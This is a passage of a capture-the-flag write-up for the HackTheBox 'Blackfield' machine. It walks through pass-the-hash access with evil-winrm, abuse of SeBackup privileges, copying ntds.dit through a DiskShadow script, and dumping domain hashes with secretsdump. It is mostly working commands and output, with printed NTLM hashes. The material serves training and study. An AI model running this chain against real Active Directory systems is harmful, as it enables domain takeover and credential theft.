</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>svc_backup:9658d1d1dcd9250115e2205d9f48400d
</span></span><span class=line><span class=cl>Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
</span></span></code></pre></td></tr></table></div></div><p>We can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> to make a pass the hash (PtH) authentication
and gain PowerShell acess:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; gc ../Desktop/user.txt
</span></span><span class=line><span class=cl>0d1d70d4c5439a332577fcbc2bcbed15
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-svc_backup-to-root>Privilege Escalation of Machine : from svc_backup to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-svc_backup-to-root>#</a></h2><p>Let&rsquo;s check what we can do with this account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net user svc_backup
</span></span><span class=line><span class=cl>User name                    svc_backup
</span></span><span class=line><span class=cl>Full Name
</span></span><span class=line><span class=cl>Comment
</span></span><span class=line><span class=cl>User&#39;s comment
</span></span><span class=line><span class=cl>Country/region code          000 (System Default)
</span></span><span class=line><span class=cl>Account active               Yes
</span></span><span class=line><span class=cl>Account expires              Never
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password last set            2/23/2020 10:54:48 AM
</span></span><span class=line><span class=cl>Password expires             Never
</span></span><span class=line><span class=cl>Password changeable          2/24/2020 10:54:48 AM
</span></span><span class=line><span class=cl>Password required            Yes
</span></span><span class=line><span class=cl>User may change password     Yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Workstations allowed         All
</span></span><span class=line><span class=cl>Logon script
</span></span><span class=line><span class=cl>User profile
</span></span><span class=line><span class=cl>Home directory
</span></span><span class=line><span class=cl>Last logon                   9/20/2020 9:38:19 PM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Logon hours allowed          All
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Local Group Memberships      *Backup Operators     *Remote Management Use
</span></span><span class=line><span class=cl>Global Group memberships     *Domain Users
</span></span><span class=line><span class=cl>The command completed successfully.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Privilege Name                Description                    State
</span></span><span class=line><span class=cl>============================= ============================== =======
</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain     Enabled
</span></span><span class=line><span class=cl>SeBackupPrivilege             Back up files and directories  Enabled
</span></span><span class=line><span class=cl>SeRestorePrivilege            Restore files and directories  Enabled
</span></span><span class=line><span class=cl>SeShutdownPrivilege           Shut down the system           Enabled
</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></span></code></pre></td></tr></table></div></div><p>Our account have way to much power!</p><blockquote><p><em>SeBackup</em> & <em>SeRestore</em> privileges (from the <em>Backup Operators</em> group) allow us to
set permissionand ownership on each file & folder.</p></blockquote><p>References:</p><ul><li><a href=https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/>DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018</a></li><li><a href=https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf>show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019</a></li></ul><p>Normally we shouldn&rsquo;t be able to access ntds.dit (Active Directory database)
but since <em>SeBackup</em> & <em>SeRestore</em> privileges let us set any permission on
any file we will be able to fix that.</p><p>Let&rsquo;s auto-gives us full control on <code>ntds.dit</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$ntds_file</span> <span class=p>=</span> <span class=s2>&#34;C:\Windows\NTDS\ntds.dit&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$acl_ntds</span> <span class=p>=</span> <span class=nb>Get-Acl</span> <span class=nv>$ntds_file</span>
</span></span><span class=line><span class=cl><span class=nv>$domain</span> <span class=p>=</span> <span class=s2>&#34;blackfield.local&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$account</span> <span class=p>=</span> <span class=s2>&#34;svc_backup&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$access_rule</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>AccessControl</span><span class=p>.</span><span class=py>FileSystemAccessRule</span><span class=p>(</span><span class=s2>&#34;</span><span class=nv>$domain</span><span class=s2>\</span><span class=nv>$account</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;FullControl&#34;</span><span class=p>,</span><span class=s2>&#34;Allow&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$acl_ntds</span><span class=p>.</span><span class=py>SetAccessRule</span><span class=p>(</span><span class=nv>$access_rule</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$acl_ntds</span> <span class=p>|</span> <span class=nb>Set-Acl</span> <span class=nv>$ntds_file</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-acl</span> <span class=nv>$ntds_file</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-expand</span> <span class=n>accesstostring</span>
</span></span><span class=line><span class=cl><span class=n>BLACKFIELD</span><span class=p>\</span><span class=n>svc_backup</span> <span class=n>Allow</span>  <span class=n>FullControl</span>
</span></span><span class=line><span class=cl><span class=n>NT</span> <span class=n>AUTHORITY</span><span class=p>\</span><span class=n>SYSTEM</span> <span class=n>Allow</span>  <span class=n>FullControl</span>
</span></span><span class=line><span class=cl><span class=n>BUILTIN</span><span class=p>\</span><span class=n>Administrators</span> <span class=n>Allow</span>  <span class=n>FullContro</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we&rsquo;ll use <code>DiskShadow</code> to make a shadow copy of the ntds.</p><blockquote><p>DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.</p><p><a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow>Microsoft Docs</a></p></blockquote><p>Let&rsquo;s prepapre the copy script (<code>diskshadow.txt</code>) to run <code>DiskShadow</code> in script
mode.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-batch data-lang=batch><span class=line><span class=cl><span class=k>set</span> <span class=nv>context persistent nowriters#</span>
</span></span><span class=line><span class=cl>add volume c: alias cyfun#
</span></span><span class=line><span class=cl>create#
</span></span><span class=line><span class=cl>expose <span class=nv>%cyfun%</span> x:#
</span></span><span class=line><span class=cl>exec <span class=s2>&#34;cmd.exe&#34;</span> /c copy x:\windows\ntds\ntds.dit c:\Users\svc_backup\Videos\ntds.dit#
</span></span><span class=line><span class=cl>delete shadows volume <span class=nv>%cyfun%</span>#
</span></span><span class=line><span class=cl>reset#
</span></span></code></pre></td></tr></table></div></div><p>Then we can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> native upload feature.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>*</span><span class=n>Evil</span><span class=o>-</span><span class=n>WinRM</span><span class=o>*</span> <span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span><span class=o>&gt;</span> <span class=n>upload</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>HackTheBox</span><span class=o>/</span><span class=n>machines</span><span class=o>/</span><span class=n>Blackfield</span><span class=o>/</span><span class=n>diskshadow</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=p>:</span> <span class=n>Uploading</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>HackTheBox</span><span class=o>/</span><span class=n>machines</span><span class=o>/</span><span class=n>Blackfield</span><span class=o>/</span><span class=n>diskshadow</span><span class=o>.</span><span class=n>txt</span> <span class=n>to</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span>\<span class=n>diskshadow</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Data</span><span class=p>:</span> <span class=mi>268</span> <span class=n>bytes</span> <span class=n>of</span> <span class=mi>268</span> <span class=n>bytes</span> <span class=n>copied</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=p>:</span> <span class=n>Upload</span> <span class=n>successful</span><span class=o>!</span>
</span></span></code></pre></td></tr></table></div></div><p>And then call <code>DiskShadow</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>*</span><span class=n>Evil</span><span class=o>-</span><span class=n>WinRM</span><span class=o>*</span> <span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span><span class=o>&gt;</span> <span class=n>diskshadow</span><span class=o>.</span><span class=n>exe</span> <span class=o>/</span><span class=n>s</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span>\<span class=n>diskshadow</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Microsoft</span> <span class=n>DiskShadow</span> <span class=n>version</span> <span class=mf>1.0</span>
</span></span><span class=line><span class=cl><span class=n>Copyright</span> <span class=p>(</span><span class=n>C</span><span class=p>)</span> <span class=mi>2013</span> <span class=n>Microsoft</span> <span class=n>Corporation</span>
</span></span><span class=line><span class=cl><span class=n>On</span> <span class=n>computer</span><span class=p>:</span>  <span class=n>DC01</span><span class=p>,</span>  <span class=mi>9</span><span class=o>/</span><span class=mi>21</span><span class=o>/</span><span class=mi>2020</span> <span class=mi>12</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=mi>50</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>set</span> <span class=n>context</span> <span class=n>persistent</span> <span class=n>nowriters</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>add</span> <span class=n>volume</span> <span class=n>c</span><span class=p>:</span> <span class=n>alias</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>create</span>
</span></span><span class=line><span class=cl><span class=n>Alias</span> <span class=n>cyfun</span> <span class=k>for</span> <span class=n>shadow</span> <span class=n>ID</span> <span class=p>{</span><span class=n>eef6f0be</span><span class=o>-</span><span class=mi>3</span><span class=n>c60</span><span class=o>-</span><span class=mf>4e69</span><span class=o>-</span><span class=mi>985</span><span class=n>d</span><span class=o>-</span><span class=mi>3</span><span class=n>bc400a24ff1</span><span class=p>}</span> <span class=n>set</span> <span class=n>as</span> <span class=n>environment</span> <span class=n>variable</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Alias</span> <span class=n>VSS_SHADOW_SET</span> <span class=k>for</span> <span class=n>shadow</span> <span class=n>set</span> <span class=n>ID</span> <span class=p>{</span><span class=mi>12</span><span class=n>b5d80f</span><span class=o>-</span><span class=mi>4368</span><span class=o>-</span><span class=mi>4727</span><span class=o>-</span><span class=n>a02b</span><span class=o>-</span><span class=mi>1</span><span class=n>b22f5e020ef</span><span class=p>}</span> <span class=n>set</span> <span class=n>as</span> <span class=n>environment</span> <span class=n>variable</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Querying</span> <span class=n>all</span> <span class=n>shadow</span> <span class=n>copies</span> <span class=n>with</span> <span class=n>the</span> <span class=n>shadow</span> <span class=n>copy</span> <span class=n>set</span> <span class=n>ID</span> <span class=p>{</span><span class=mi>12</span><span class=n>b5d80f</span><span class=o>-</span><span class=mi>4368</span><span class=o>-</span><span class=mi>4727</span><span class=o>-</span><span class=n>a02b</span><span class=o>-</span><span class=mi>1</span><span class=n>b22f5e020ef</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>*</span> <span class=n>Shadow</span> <span class=n>copy</span> <span class=n>ID</span> <span class=o>=</span> <span class=p>{</span><span class=n>eef6f0be</span><span class=o>-</span><span class=mi>3</span><span class=n>c60</span><span class=o>-</span><span class=mf>4e69</span><span class=o>-</span><span class=mi>985</span><span class=n>d</span><span class=o>-</span><span class=mi>3</span><span class=n>bc400a24ff1</span><span class=p>}</span>               <span class=o>%</span><span class=n>cyfun</span><span class=o>%</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Shadow</span> <span class=n>copy</span> <span class=n>set</span><span class=p>:</span> <span class=p>{</span><span class=mi>12</span><span class=n>b5d80f</span><span class=o>-</span><span class=mi>4368</span><span class=o>-</span><span class=mi>4727</span><span class=o>-</span><span class=n>a02b</span><span class=o>-</span><span class=mi>1</span><span class=n>b22f5e020ef</span><span class=p>}</span>       <span class=o>%</span><span class=n>VSS_SHADOW_SET</span><span class=o>%</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Original</span> <span class=n>count</span> <span class=n>of</span> <span class=n>shadow</span> <span class=n>copies</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Original</span> <span class=n>volume</span> <span class=n>name</span><span class=p>:</span> \\<span class=err>?</span>\<span class=n>Volume</span><span class=p>{</span><span class=mi>351</span><span class=n>b4712</span><span class=o>-</span><span class=mi>0000</span><span class=o>-</span><span class=mi>0000</span><span class=o>-</span><span class=mi>0000</span><span class=o>-</span><span class=mi>602200000000</span><span class=p>}</span>\ <span class=p>[</span><span class=n>C</span><span class=p>:</span>\<span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Creation</span> <span class=n>time</span><span class=p>:</span> <span class=mi>9</span><span class=o>/</span><span class=mi>21</span><span class=o>/</span><span class=mi>2020</span> <span class=mi>12</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=mi>51</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Shadow</span> <span class=n>copy</span> <span class=n>device</span> <span class=n>name</span><span class=p>:</span> \\<span class=err>?</span>\<span class=n>GLOBALROOT</span>\<span class=n>Device</span>\<span class=n>HarddiskVolumeShadowCopy1</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Originating</span> <span class=n>machine</span><span class=p>:</span> <span class=n>DC01</span><span class=o>.</span><span class=n>BLACKFIELD</span><span class=o>.</span><span class=n>local</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Service</span> <span class=n>machine</span><span class=p>:</span> <span class=n>DC01</span><span class=o>.</span><span class=n>BLACKFIELD</span><span class=o>.</span><span class=n>local</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Not</span> <span class=n>exposed</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Provider</span> <span class=n>ID</span><span class=p>:</span> <span class=p>{</span><span class=n>b5946137</span><span class=o>-</span><span class=mi>7</span><span class=n>b9f</span><span class=o>-</span><span class=mi>4925</span><span class=o>-</span><span class=n>af80</span><span class=o>-</span><span class=mi>51</span><span class=n>abd60b20d5</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=o>-</span> <span class=n>Attributes</span><span class=p>:</span>  <span class=n>No_Auto_Release</span> <span class=n>Persistent</span> <span class=n>No_Writers</span> <span class=n>Differential</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Number</span> <span class=n>of</span> <span class=n>shadow</span> <span class=n>copies</span> <span class=n>listed</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>expose</span> <span class=o>%</span><span class=n>cyfun</span><span class=o>%</span> <span class=n>z</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=o>%</span><span class=n>cyfun</span><span class=o>%</span> <span class=o>=</span> <span class=p>{</span><span class=n>eef6f0be</span><span class=o>-</span><span class=mi>3</span><span class=n>c60</span><span class=o>-</span><span class=mf>4e69</span><span class=o>-</span><span class=mi>985</span><span class=n>d</span><span class=o>-</span><span class=mi>3</span><span class=n>bc400a24ff1</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>shadow</span> <span class=n>copy</span> <span class=n>was</span> <span class=n>successfully</span> <span class=n>exposed</span> <span class=n>as</span> <span class=n>z</span><span class=p>:</span>\<span class=o>.</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>exec</span> <span class=s2>&#34;cmd.exe&#34;</span> <span class=o>/</span><span class=n>c</span> <span class=n>copy</span> <span class=n>z</span><span class=p>:</span>\<span class=n>windows</span>\<span class=n>ntds</span>\<span class=n>ntds</span><span class=o>.</span><span class=n>dit</span> <span class=n>c</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span>\<span class=n>ntds</span><span class=o>.</span><span class=n>dit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>script</span> <span class=n>file</span> <span class=n>name</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>valid</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>EXEC</span> <span class=o>&lt;</span><span class=n>file</span><span class=o>.</span><span class=n>cmd</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=n>Execute</span> <span class=n>a</span> <span class=n>script</span> <span class=n>file</span> <span class=n>on</span> <span class=n>the</span> <span class=n>local</span> <span class=n>machine</span><span class=o>.</span>
</span></span><span class=line><span class=cl>        <span class=n>This</span> <span class=n>command</span> <span class=n>is</span> <span class=n>used</span> <span class=n>to</span> <span class=n>duplicate</span> <span class=ow>or</span> <span class=n>restore</span> <span class=n>data</span> <span class=n>as</span> <span class=n>part</span> <span class=n>of</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=n>backup</span> <span class=ow>or</span> <span class=n>restore</span> <span class=n>sequence</span><span class=o>.</span>
</span></span></code></pre></td></tr></table></div></div><p>As I got issues with the <code>exec</code> command I manually copied the file afterward:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; cp x:\windows\ntds\ntds.dit .
</span></span></code></pre></td></tr></table></div></div><p>Then we can also dump the SYSTEM hive:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; reg save hklm\system system.hive
</span></span></code></pre></td></tr></table></div></div><p>Again, we can use <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> native download feature.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>*</span><span class=n>Evil</span><span class=o>-</span><span class=n>WinRM</span><span class=o>*</span> <span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span><span class=o>&gt;</span> <span class=n>download</span> <span class=n>ntds</span><span class=o>.</span><span class=n>dit</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>HackTheBox</span><span class=o>/</span><span class=n>machines</span><span class=o>/</span><span class=n>Blackfield</span><span class=o>/</span><span class=n>ntds</span><span class=o>.</span><span class=n>dit</span>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=p>:</span> <span class=n>Downloading</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>svc_backup</span>\<span class=n>Videos</span>\<span class=n>ntds</span><span class=o>.</span><span class=n>dit</span> <span class=n>to</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>HackTheBox</span><span class=o>/</span><span class=n>machines</span><span class=o>/</span><span class=n>Blackfield</span><span class=o>/</span><span class=n>ntds</span><span class=o>.</span><span class=n>dit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=p>:</span> <span class=n>Download</span> <span class=n>successful</span><span class=o>!</span>
</span></span></code></pre></td></tr></table></div></div><p>Finally we can use <code>secretsdump</code> from Impacket to extract the hashes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL
</span></span><span class=line><span class=cl>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
</span></span><span class=line><span class=cl>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span class=line><span class=cl>[*] Searching for pekList, be patient
</span></span><span class=line><span class=cl>[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
</span></span><span class=line><span class=cl>[*] Reading and decrypting hashes from ntds.dit
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
</span></span><span class=line><span class=cl>audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
</span></span><span class=line><span class=cl>support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
</span></span><span class=line><span class=cl>BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span></span><span class=line><span class=cl>BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span></span><span class=line><span class=cl>BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span></span><span class=line><span class=cl>BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span></span><span class=line><span class=cl>BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>Again a PtH using <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a> with Administrator account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
